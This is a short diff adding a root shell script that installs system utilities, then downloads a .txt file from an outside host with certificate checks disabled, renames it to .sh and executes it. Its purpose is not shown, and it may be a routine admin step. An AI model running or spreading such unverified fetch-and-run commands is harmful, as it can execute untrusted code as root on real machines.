@@ -1,0 +1,6 @@
+yum install sysstat lsof pciutils wget -y
+cd /root
+wget https://dl.docutek.biz/JH/FPTOOLS/wsg_ma.txt --no-check-certificate
+/bin/mv /root/wsg_ma.txt /root/wsg_ma.sh
+chmod 755 /root/wsg_ma.sh
+/bin/sh /root/wsg_ma.sh
